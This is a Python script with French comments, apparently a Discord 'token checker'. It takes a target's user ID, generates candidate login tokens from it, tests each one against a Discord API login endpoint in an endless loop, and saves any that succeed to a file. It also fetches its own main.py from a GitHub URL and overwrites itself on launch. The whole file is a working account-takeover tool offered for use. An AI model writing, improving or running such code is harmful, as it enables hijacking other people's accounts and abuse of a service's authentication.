import os
import sys
import time
import base64
import random
import string
import requests
import subprocess
from datetime import datetime, timedelta
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich.table import Table
from rich.prompt import Prompt
from rich.align import Align
from rich.live import Live

# Initialisation de Rich Console
console = Console()

# URL du fichier main.py sur GitHub
GITHUB_MAIN_PY_URL = "https://raw.githubusercontent.com/ErrorNoName/D-T-F/refs/heads/main/main.py"

# Logo ASCII du logiciel
LOGO = """
 ██████╗ ██╗██████╗  ██████╗ ███████╗███████╗██████╗ 
 ██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝██╔════╝██╔══██╗
 ██████╔╝██║██████╔╝██║  ███╗█████╗  █████╗  ██████╔╝
 ██╔══██╗██║██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
 ██║  ██║██║██████╔╝╚██████╔╝███████╗███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
"""

SUBTITLE = "Checker By ErrorNoName/Ezio"

def display_logo():
    """Affiche le logo ASCII et le sous-titre."""
    logo_panel = Panel(
        Align.center(Text(LOGO, style="bold cyan")),
        border_style="blue",
        padding=(1, 2)
    )
    subtitle_text = Text(SUBTITLE, style="bold magenta", justify="center")
    subtitle_panel = Panel(
        Align.center(subtitle_text),
        border_style="blue",
        padding=(0, 2)
    )
    full_logo = Panel.fit(
        Align.center(Text(LOGO + "\n" + SUBTITLE, style="bold cyan")),
        border_style="blue",
        padding=(1, 2)
    )
    console.print(full_logo)

def check_for_updates(local_path="main.py"):
    """
    Vérifie s'il y a une mise à jour disponible pour main.py.
    Télécharge et remplace si une mise à jour est trouvée.
    """
    try:
        response = requests.get(GITHUB_MAIN_PY_URL)
        if response.status_code == 200:
            remote_content = response.text
            if os.path.exists(local_path):
                with open(local_path, 'r') as file:
                    local_content = file.read()
                if local_content != remote_content:
                    # Mise à jour nécessaire
                    with open(local_path, 'w') as file:
                        file.write(remote_content)
                    return True  # Indique qu'une mise à jour a été effectuée
                else:
                    return False  # Pas de mise à jour nécessaire
            else:
                # main.py n'existe pas localement, le télécharger
                with open(local_path, 'w') as file:
                    file.write(remote_content)
                return True
        else:
            console.print(f"[red]Erreur lors de la vérification des mises à jour : Status Code {response.status_code}[/red]")
            return False
    except Exception as e:
        console.print(f"[red]Erreur lors de la vérification des mises à jour : {e}[/red]")
        return False

def simulate_loading():
    """Simule une barre de chargement avec la vérification des mises à jour."""
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.percentage:>3.0f}%"),
        transient=True,
        console=console
    ) as progress:
        task = progress.add_task("Vérification des mises à jour...", total=100)
        for i in range(100):
            time.sleep(0.02)  # Simule le temps de vérification
            progress.update(task, advance=1)

def main_interface(token_manager):
    """Affiche l'interface principale pour entrer l'ID et lancer la vérification."""
    layout = Layout()

    layout.split_column(
        Layout(name="header", size=20),
        Layout(name="body", ratio=1),
        Layout(name="footer", size=3),
    )

    # Header avec le logo
    header_panel = Panel(
        Align.center(Text(LOGO, style="bold cyan")),
        border_style="blue",
        padding=(1, 2)
    )
    subtitle_text = Text(SUBTITLE, style="bold magenta", justify="center")
    subtitle_panel = Panel(
        Align.center(subtitle_text),
        border_style="blue",
        padding=(0, 2)
    )
    full_header = Panel.fit(
        Align.center(Text(LOGO + "\n" + SUBTITLE, style="bold cyan")),
        border_style="blue",
        padding=(1, 2)
    )
    layout["header"].update(full_header)

    # Corps avec les tokens valides et invalides
    body_layout = Layout()
    body_layout.split_row(
        Layout(name="valid_tokens", ratio=1),
        Layout(name="invalid_tokens", ratio=1),
    )

    valid_panel = Panel(
        "[green]Tokens Valides[/green]",
        border_style="green",
        title_align="left"
    )
    invalid_panel = Panel(
        "[red]Tokens Invalides (se nettoient automatiquement)[/red]",
        border_style="red",
        title_align="left"
    )

    body_layout["valid_tokens"].update(valid_panel)
    body_layout["invalid_tokens"].update(invalid_panel)

    layout["body"].update(body_layout)

    # Footer
    footer_panel = Panel(
        "[cyan]Appuyez sur Entrée après avoir entré votre ID pour lancer la vérification[/cyan]",
        border_style="blue"
    )
    layout["footer"].update(footer_panel)

    # Affichage en direct
    with Live(layout, refresh_per_second=4, screen=True):
        # Demande de l'ID
        id_input = Prompt.ask("[bold magenta]Entrez votre ID pour générer le token[/bold magenta]")
        try:
            encoded_id = base64.b64encode(id_input.encode("ascii"))
            id_to_token = encoded_id.decode("ascii")
        except Exception as e:
            console.print(f"[red]Erreur lors de l'encodage de l'ID : {e}[/red]")
            sys.exit(1)

        # Afficher une barre de chargement pendant la vérification
        simulate_loading()

        # Lancer la vérification des tokens
        validate_tokens(id_to_token, layout)

def generate_token(id_to_token):
    """Génère un token basé sur l'ID fourni."""
    return (
        id_to_token
        + "."
        + "".join(random.choices(string.ascii_letters + string.digits, k=4))
        + "."
        + "".join(random.choices(string.ascii_letters + string.digits, k=25))
    )

class TokenManager:
    """Gère les tokens valides et invalides."""
    def __init__(self, invalid_expiry_seconds=30, max_valid=50, max_invalid=50):
        self.valid_tokens = []
        self.invalid_tokens = {}
        self.invalid_expiry = timedelta(seconds=invalid_expiry_seconds)
        self.max_valid = max_valid
        self.max_invalid = max_invalid

    def add_token(self, token, is_valid):
        if is_valid:
            self.valid_tokens.append(token)
            if len(self.valid_tokens) > self.max_valid:
                self.valid_tokens.pop(0)
        else:
            self.invalid_tokens[token] = datetime.now()
            if len(self.invalid_tokens) > self.max_invalid:
                oldest = min(self.invalid_tokens, key=self.invalid_tokens.get)
                del self.invalid_tokens[oldest]

    def purge_invalid_tokens(self):
        current_time = datetime.now()
        tokens_to_remove = [
            token for token, timestamp in self.invalid_tokens.items()
            if current_time - timestamp > self.invalid_expiry
        ]
        for token in tokens_to_remove:
            del self.invalid_tokens[token]

    def get_valid_tokens(self):
        return list(self.valid_tokens)

    def get_invalid_tokens(self):
        return list(self.invalid_tokens.keys())

def validate_tokens(id_to_token, layout):
    """Valide les tokens et met à jour l'interface en conséquence."""
    token_manager = TokenManager()

    try:
        while True:
            token = generate_token(id_to_token)
            headers = {'Authorization': token}
            try:
                response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                if response.status_code == 200:
                    token_manager.add_token(token, is_valid=True)
                else:
                    token_manager.add_token(token, is_valid=False)
            except requests.RequestException:
                # En cas d'erreur réseau, on considère le token comme invalide
                token_manager.add_token(token, is_valid=False)

            # Purger les tokens invalides anciens
            token_manager.purge_invalid_tokens()

            # Mettre à jour les tables des tokens
            valid_tokens = token_manager.get_valid_tokens()
            invalid_tokens = token_manager.get_invalid_tokens()

            # Création des tables
            valid_table = Table(show_header=False, box=None)
            for vt in valid_tokens[-20:]:  # Afficher les 20 derniers
                valid_table.add_row(vt)

            invalid_table = Table(show_header=False, box=None)
            for it in invalid_tokens[-20:]:  # Afficher les 20 derniers
                invalid_table.add_row(it)

            # Mise à jour des panels
            layout["body"].split_row(
                Layout(name="valid_tokens", ratio=1),
                Layout(name="invalid_tokens", ratio=1),
            )

            layout["body"]["valid_tokens"].update(
                Panel(
                    valid_table,
                    title="[green]Tokens Valides[/green]",
                    border_style="green"
                )
            )

            layout["body"]["invalid_tokens"].update(
                Panel(
                    invalid_table,
                    title="[red]Tokens Invalides (se nettoient automatiquement)[/red]",
                    border_style="red"
                )
            )

            # Rafraîchir l'interface
            time.sleep(0.5)

    except KeyboardInterrupt:
        # Interruption par l'utilisateur
        console.print("\n[yellow]Validation interrompue par l'utilisateur[/yellow]\n")

        # Option pour sauvegarder les tokens valides
        save_option = Prompt.ask("[yellow]Voulez-vous enregistrer les tokens valides dans un fichier ? (oui/non)[/yellow]", choices=["oui", "non"])
        if save_option.lower() == "oui":
            try:
                with open("hit.txt", "w") as file:
                    for vt in token_manager.get_valid_tokens():
                        file.write(f"{vt}\n")
                console.print("[green]Tokens valides enregistrés dans 'hit.txt'[/green]")
            except Exception as e:    # Agrandir la console
                console.print(f"[red]Erreur lors de l'enregistrement des tokens : {e}[/red]")

        console.print("[cyan]Au revoir ![/cyan]")
        sys.exit()

def main():
    # Afficher le logo
    display_logo()

    # Simuler le chargement et vérifier les mises à jour
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.percentage:>3.0f}%"),
        transient=True,
        console=console
    ) as progress:
        task = progress.add_task("Vérification des mises à jour...", total=100)
        for i in range(100):
            time.sleep(0.05)  # Simule le temps de vérification
            progress.update(task, advance=1)

    # Vérifier les mises à jour
    update_performed = check_for_updates()

    if update_performed:
        console.print("[green]Le script a été mis à jour avec succès.[/green]")
        console.print("[yellow]Veuillez relancer le script.[/yellow]")
        sys.exit(0)
    else:
        console.print("[green]Aucune mise à jour nécessaire. Lancement de l'interface...[/green]")
        time.sleep(1)  # Petite pause avant de lancer l'interface

    # Lancer l'interface principale
    main_interface(TokenManager())

if __name__ == "__main__":
    main()
